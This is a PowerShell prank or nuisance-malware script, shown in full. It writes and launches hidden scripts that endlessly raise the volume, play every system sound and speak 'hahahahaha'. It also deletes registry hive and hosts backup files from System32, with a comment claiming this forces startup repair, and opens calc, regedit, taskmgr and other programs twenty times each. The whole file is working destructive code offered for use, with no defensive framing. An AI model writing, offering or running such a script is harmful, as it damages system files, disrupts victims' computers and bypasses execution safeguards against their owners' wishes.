$notificationScriptContent = @'
Function Send-NotificationSoundSpam {
    param ([int]$Interval = 0)

    Get-ChildItem C:\Windows\Media\ -File -Filter *.wav | Select-Object -ExpandProperty Name | ForEach-Object {
        (New-Object Media.SoundPlayer "C:\WINDOWS\Media\$_").PlaySync()
        Start-Sleep -Milliseconds 1
    }
}

Send-NotificationSoundSpam
'@
$notificationScriptPath = "$PWD\notification.ps1"
Set-Content -Path $notificationScriptPath -Value $notificationScriptContent

$trayScriptContent = @'
$WScript = New-Object -com wscript.shell
while ($true) {
    $WScript.SendKeys([char]175)
    Start-Sleep -Milliseconds 1
}
'@
$trayScriptPath = "$PWD\tray.ps1"
Set-Content -Path $trayScriptPath -Value $trayScriptContent

$speechScriptContent = @'
Add-Type -AssemblyName System.Speech
$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer
while ($true) {
    $speak.Speak("hahahahaha")
    Start-Sleep -Milliseconds 1
}
'@
$speechScriptPath = "$PWD\speech.ps1"
Set-Content -Path $speechScriptPath -Value $speechScriptContent

# removes system files, forces startup repair (does not brick system)
$systemFiles = @(
    "C:\Windows\System32\config\SOFTWARE.bak",
    "C:\Windows\System32\config\SYSTEM.bak",
    "C:\Windows\System32\config\SECURITY.bak",
    "C:\Windows\System32\config\SAM.bak",
    "C:\Windows\System32\drivers\etc\hosts.bak",
    "C:\Windows\System32\drivers\etc\networks.bak",
    "C:\Windows\System32\drivers\etc\protocol.bak",
    "C:\Windows\System32\drivers\etc\services.bak"
)

foreach ($file in $systemFiles) {
    if (Test-Path -Path $file) {
        Remove-Item -Path $file -Force
    }
}

Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$speechScriptPath`""
Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$notificationScriptPath`""
Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$trayScriptPath`""

$WScript = New-Object -com wscript.shell
1..50 | % { $WScript.SendKeys([char]175) }

$processes = @("calc.exe", "explorer.exe", "notepad.exe", "cmd.exe", "regedit.exe", "msinfo32.exe", "taskmgr.exe")
for ($i = 1; $i -le 20; $i++) {
    foreach ($process in $processes) {
        Start-Process -FilePath $process -NoNewWindow
    }
}
